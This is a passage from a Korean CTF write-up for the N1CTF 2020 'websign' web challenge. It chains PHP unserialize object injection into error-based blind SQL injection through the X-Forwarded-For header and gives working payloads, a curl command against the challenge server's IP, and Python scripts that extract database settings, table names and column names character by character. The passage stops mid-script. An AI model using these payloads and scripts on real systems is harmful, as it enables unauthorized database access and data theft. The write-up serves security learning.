class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip =<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$con</span>=mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;********&quot;</span>,<span class="string">&quot;n1ctf_websign&quot;</span>);</span><br><span class="line">        <span class="variable">$sqlquery</span>=sprintf(<span class="string">&quot;INSERT into n1ip(`ip`,`time`) VALUES (&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span>,<span class="keyword">$this</span>-&gt;waf(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]),time());</span><br><span class="line">        <span class="keyword">if</span>(!mysqli_query(<span class="variable">$con</span>,<span class="variable">$sqlquery</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> mysqli_error(<span class="variable">$con</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;your ip looks ok!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close(<span class="variable">$con</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = <span class="variable">$ip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">&quot;key****************&quot;</span>))&#123;</span><br><span class="line">    readfile(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">&quot;n1ctf&quot;</span>)!==<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;welcome to n1ctf2020&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;noip&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$input</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>ip</code>라는 클래스를 확인해 보면 먼저 <code>__construct()</code> 메서드가 실행이 될 건데, 해당 메서드가 실행이 되면 <code>X_Forwarded_for</code>이라는 변수 설정 유/무를 확인하고, 설정이 되어 있다면 <code>X_Forwarded_for</code>의 값을 아이피의 값으로 사용하고, 설정이 안 되어 있다면 아이피의 값으로 <code>Remote_Addr</code> 값을 넣어 사용하는 것을 볼 수 있습니다.</p><p><code>__construct()</code> 메서드가 실행된 후에 <code>__toString(</code>) 메서드가 실행이 되는 데, 해당 메서드는 클래스 자체가 문자열로 처리를 될 때 실행이 된다고 합니다. 그래서 클래스가 문자열로 처리가 돼서 실행이 되면 <code>mysqli_query()</code> 함수를 이용해서 Insert 문 요청을 보내주는 것을 볼 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = <span class="variable">$ip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">&quot;key****************&quot;</span>))&#123;</span><br><span class="line">    readfile(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">&quot;n1ctf&quot;</span>)!==<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;welcome to n1ctf2020&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;noip&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>flag</code>라는 클래스를 확인해 보면 <code>__construct()</code> 메서드가 실행이 되면 <code>$ip</code>의 값을 <code>$this-&gt;ip</code>로 넣어주고, 그다음 <code>__wakeup()</code> 메서드가 실행이 되는 데 이때 <code>$this-&gt;ip</code>의 값이 <code>n1ctf</code>이면 <code>welcome to n1ctf2020</code>로 값을 바꾸고, <code>$this-&gt;ip</code>의 값이 <code>n1ctf</code>가 아니면 <code>noip</code>로 값을 바꿉니다.</p><p>그리고 <code>__destruct()</code> 메서드가 실행되면서 <code>getflag()</code> 함수가 실행이 되는데, 이때 <code>getflag()</code> 함수에서 <code>md5($this-&gt;check)</code>의 값이 <code>Key</code> 값과 동일하면 <code>/flag</code> 파일을 읽어 FLAG를 리턴해주고, 값이 동일하지 않으면 <code>$this-&gt;i</code>p의 값을 리턴해주는 것을 볼 수 있습니다.</p><p>위 소스 코드를 분석한 결과 이번 문제의 요점은 <code>Ke</code>y 값을 찾고, 해당 <code>Key</code> 값 기반으로 POI를 해서 FLAG를 획득하는 문제인 거 같습니다. 하지만 소스 코드를 보면 Key 값은 내부 서버에 있는 소스 코드에서만 볼 수 있을 거 같아서 index.php 파일을 릭 해야 한다고 생각했습니다.</p><p>여기서 첫 번째 난간, SQLI를 어떻게 하지? POI -&gt; SQLI?</p><p>SQL 로직이 그냥 주어지진 않았을 것 같아서 SQLI을 의심해보았습니다. 그래서 <code>ip</code> 클래스에서 <code>__toString()</code> 메서드를 이용해서 블라인드 <code>SQL 인젝션</code>을 통해 파일을 찾고, 파일을 릭 한다면 해당 Key로 FLAG를 찾는 방법으로 시나리오를 먼저 구성했습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/t2kvu/btqK83qQ8VI/MBhwxD4ZlaFTQRC94WNLA1/img.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;ip&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure><p>그래서 위 페이로드를 작성해서 보내 보았지만 예상과 다르게 SQL 에러도 출력이 되지 않았고, <code>your ip looks ok!</code>이라는 문구도 출력이 되지 않았습니다. 즉, <code>__toString()</code> 메서드가 실행이 되지 않은 것입니다.</p><p>음.. <code>__toString()</code> 메서드가 실행이 되지 않은 이유는 뭐.. 하나 일 것입니다. 해당 클래스가 <code>문자열</code>로 처리를 하지 않기 때문에 <code>__toString()</code> 메서드가 반응을 하지 않는 것입니다.</p><p>그런데 <code>flag</code> 클래스에서 <code>stristr()</code> 함수를 사용하고 있는 것을 볼 수 있었습니다. 만약 <code>$this-&gt;ip</code>의 값으로 <code>ip</code> 클래스를 넘겨주면 어떻게 될까 생각을 해본 결과, 문자열 함수로 클래스가 들어가면 해당 클래스도 문자열로 처리가 되는 거겠지?라고 생각을 했습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">&quot;n1ctf&quot;</span>)!==<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;welcome to n1ctf2020&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;noip&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 <code>stristr()</code> 함수에서 <code>__toString()</code> 메서드가 실행이 되면 <code>$this-&gt;ip</code>의 값으로 <code>mysqli Error</code>를 리턴 받거나, <code>your ip looks ok!</code>라는 문구를 리턴을 받을 것이고, 그럼 항상 <code>noip</code> 문구가 출력이 될 것입니다.</p><p>그래서 SQL 쿼리를 조작해서 IF문을 사용해 쿼리가 참이면 에러를 출력시키게 하고, 해당 에러에 <code>n1ctf</code> 문자가 출력이 되게 하면 블라인드 SQL 인젝션이 가능하지 않을까 생각을 해보았습니다. stristr() 함수는 <code>n1ctf</code>라는 문자열의 패턴만 존재해도 참으로 인식합니다. 그러니 <code>afwefwfn1ctf</code>라는 값이 들어와도 해당 값에는 <code>n1ctf</code>라는 패턴이 존재하기 때문에 참으로 처리가 될 것입니다.</p><p>그래서 <code>mysql</code>에서 에러에 내가 원하는 값을 어떻게 넣어주지 생각을 해보다가, 얼마 전에 <code>exp()</code> 함수를 이용한 Error Blind Based SQL Injection 글을 작성하면서 exp() 함수를 사용한 것이 생각났습니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/Fl7sF/btqK70ajhMF/fCXjSjcKyHtlrUR5mJAkz0/img.png"></p><p>그래서 <code>mysql</code>에서 테스트를 해보니 역시나 에러를 보니 <code>n1ctf</code>라는 문자열이 들어가 있는 것을 볼 수 있었습니다. 해당 함수가 에러를 내뱉는 이유는 exp() 함수에 Max Value가 709입니다. </p><p>710부터는 오버플로우가 일어나 에러를 내 뱉게 되는 데, 위 사진을 보면 <code>709 * length(&quot;n1ctf&quot;)</code>인 것을 볼 수 있습니다. <code>length(&quot;n1ctf&quot;)</code>의 값은 5이므로 709 * 5가 되어 오버플로우가 발생해 에러를 내뱉는 것이고, 해당 에러는 사용자가 입력한 exp() 함수를 그대로 출력해주기 때문에 우리가 원하는 값을 에러에 포함시킬 수도 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POI Payload Used : O:4:&quot;flag&quot;:1:&#123;s:2:&quot;ip&quot;;O:2:&quot;ip&quot;:0:&#123;&#125;&#125;</span><br><span class="line">SQLI Payload Used : &#39;,if(1&#x3D;1, exp(709 * length(&quot;n1ctf&quot;)), &quot;False&quot;))#</span><br></pre></td></tr></table></figure><p>위와 같이 값을 보내게 되면 일단 POI Payload에 의해서 <code>__toString()</code> 메서드가 실행이 될 것입니다. (이유는 위에) 그리고 <code>X-Forwarded-for</code>의 값으로 SQLI Payload를 보내주면 Insert 문에 들어갈 것 이기 때문에 Injection이 일어날 것입니다.</p><p>SQLI Payload를 보면 if문 조건이 1=1으로 참이므로, 에러에 <code>n1ctf</code> 문구가 포함되어 리턴이 될 것입니다. 해당 리턴 값은 <code>stristr()</code> 함수의  <code>$this-&gt;ip</code>로 들어가고, <code>$this-&gt;ip</code>에는 <code>n1ctf</code> 문구가 포함되어 있어 <code>welcome to n1ctf2020</code>이 출력이 될 것입니다.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/BPeP3/btqK6B3CNsz/1AlxnouxJ8L7TO9JKfU8pK/img.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Command : curl -i -g --header &quot;X-Forwarded-for: &#39;,if(1&#x3D;1, exp(709 * length(&#39;n1ctf&#39;)), &#39;False&#39;))#&quot; http:&#x2F;&#x2F;101.32.205.189&#x2F;?input&#x3D;O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>그래서 <code>curl</code> 명령어를 이용해서 <code>POI -&gt; SQLI</code> 공격을 해보니 조건이 딱 맞아 <code>welcome to n1ctf2020</code>이 출력되는 것을 볼 수 있습니다. 이제 이를 기반으로 <code>load_file()</code> 함수를 이용해서 index.php 파일을 릭 하기만 하면 될 거 같습니다!</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cmhkpv/btqK83LcqPw/NvMFdQL2fLyDbRX3KSCI21/img.png"></p><p>그런데 <code>load_file()</code> 함수를 이용해서 <code>index.php</code> 파일을 릭 해보려고 했지만 잘 되지 않았습니다. 검색을 해보니 <code>secure_file_priv</code> 옵션을 이용해서 디렉터리를 제어할 수 있는 것을 알 수 있었습니다. 검색을 해보니 <code>@@global.secure_file_priv</code>를 참조해서 제어하고 있는 디렉터리를 볼 수 있는 거 같아서 이를 블라인드 인젝션을 이용해서 뽑아보았습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://101.32.205.189/?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;&#125;&quot;</span></span><br><span class="line">Length , path= <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;X-Forwarded-for&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((SELECT length(@@global.secure_file_priv))=&#123;&#125;, exp(709 * length(&#x27;n1ctf&#x27;)), &#x27;False&#x27;))#&quot;</span></span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(i)</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">Length = i</span><br><span class="line">print(<span class="string">&quot;[+] secure_file_priv Length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Length):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>, <span class="number">123</span>):</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((SELECT @@global.secure_file_priv),&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;, exp(709 * length(&#x27;n1ctf&#x27;)), &#x27;False&#x27;))#&quot;</span></span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">chr</span>(j))</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">path += <span class="built_in">chr</span>(j).lower()</span><br><span class="line">print(<span class="string">&quot;[+] secure_file_priv : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path))</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/cVMXwj/btqLbmjp46q/7gIYYWE5cTMmTEKfTg5pBK/img.png"></p><p>작성한 익스플로잇 코드를 돌려보니 <code>@@global.secure_file_priv</code> 값이 <code>/var/lib/mysql/files</code>인 것을 볼 수 있었습니다. 이렇기 때문에 <code>/var/www/html</code>에 있는 index.php 파일을 릭할 수 없었던 거 같습니다.</p><p>하지만 이번 문제는 SQLI를 이용해서 Key 값을 찾는 거 외에는 방법이 없는 거 같아서 DB를 그냥 털기로 마음먹었습니다. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:1:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">table_1, table_len2, table_2, column_len1, column_len2, column1, column2, key_len, key = <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name1</span>():</span></span><br><span class="line"><span class="keyword">global</span> table_1</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((select table_name from information_schema.tables where table_schema=&#x27;n1ctf_websign&#x27; limit 0, 1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;), exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;))#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>, <span class="number">122</span>):</span><br><span class="line">headers = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">chr</span>(j))&#125; </span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">table_1 += <span class="built_in">chr</span>(j)</span><br><span class="line">print(<span class="string">&quot;[+] One_Table_Name : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(table_1.lower()))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_len2</span>():</span></span><br><span class="line"><span class="keyword">global</span> table_len2</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((select length(table_name) from information_schema.tables where table_schema=&#x27;n1ctf_websign&#x27; limit 1,1) =&#123;&#125;, exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;));#&quot;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(i)</span><br><span class="line">res = requests.get(url,headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">table_len2 = i</span><br><span class="line">print(<span class="string">&quot;[+] Two_Table_Name Length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(table_len2)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name2</span>():</span></span><br><span class="line"><span class="keyword">global</span> table_2</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((select table_name from information_schema.tables where table_schema=&#x27;n1ctf_websign&#x27; limit 1, 1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;), exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;))#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(table_len2):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>, <span class="number">122</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">chr</span>(j))</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">table_2 += <span class="built_in">chr</span>(j).lower()</span><br><span class="line">print(<span class="string">&quot;[+] Two_Table_Name : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(table_2))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">table_name2_column</span>():</span></span><br><span class="line"><span class="keyword">global</span> column_len1, column_len2</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((select length(column_name) from information_schema.columns where table_schema =&#x27;n1ctf_websign&#x27; and table_name = &#x27;&#123;&#125;&#x27; limit &#123;&#125;,1) =&#123;&#125;, exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;))#&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(table_2, j, i)</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">column_len1 = i</span><br><span class="line"><span class="keyword">elif</span> j == <span class="number">1</span>:</span><br><span class="line">column_len2 = i</span><br><span class="line">print(<span class="string">&quot;[+] &#123;&#125;, &#123;&#125;_Column_Name Length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(table_2, <span class="built_in">str</span>(j+<span class="number">1</span>), <span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column</span>():</span></span><br><span class="line"><span class="keyword">global</span> column1, column2</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((select column_name from information_schema.columns where table_schema=&#x27;n1ctf_websign&#x27; and table_name = &#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;), exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;));#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">Len = <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">Len = <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(Len):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> 